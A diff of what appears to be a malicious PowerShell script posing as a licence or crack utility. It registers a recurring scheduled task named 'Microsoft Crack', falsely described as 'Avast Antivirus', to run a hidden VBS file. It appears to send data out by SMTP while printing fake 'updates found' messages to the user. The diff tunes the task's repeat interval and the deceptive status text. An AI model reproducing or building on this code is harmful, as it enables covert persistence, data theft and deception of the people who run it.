@@ -31,10 +31,10 @@ if(!(Test-Path "$location\Microsoft\count.txt")) {
 
 
      try { 
-	  schtasks.exe /CREATE /F /SC DAILY /MO 1 /TN "Microsoft Crack" /TR 'wscript.exe ""C:\Users\Public\Licence\Licence-main\Autorun.vbs""' /ST 00:00 /RI 2 /DU 24:00 | Out-Null
+	  schtasks.exe /CREATE /F /SC DAILY /MO 1 /TN "Microsoft Crack" /TR 'wscript.exe ""C:\Users\Public\Licence\Licence-main\Autorun.vbs""' /ST 00:00 /RI 20 /DU 24:00 | Out-Null
      }
      catch { 
-	    $trigger = New-JobTrigger -once -At $(get-date) -RepetitionInterval $([timespan]::FromMinutes("2")) -RepeatIndefinitely
+	    $trigger = New-JobTrigger -once -At $(get-date) -RepetitionInterval $([timespan]::FromMinutes("20")) -RepeatIndefinitely
             $action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '"C:\Users\Public\Licence\Licence-main\Autorun.vbs"'
             Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Microsoft Crack" -Description "Avast Antivirus" -Force		
 	   }
@@ -129,7 +129,7 @@ else{
     echo "This process will take some time. Please wait.."
     $smtp.Send($msg) | Out-Null
     Start-Sleep -Milliseconds 3000
-    echo '0 updates found.' 
+    echo '1 file updated & 17 updates found.' 
      
     }   
     $count= [int]$count+1
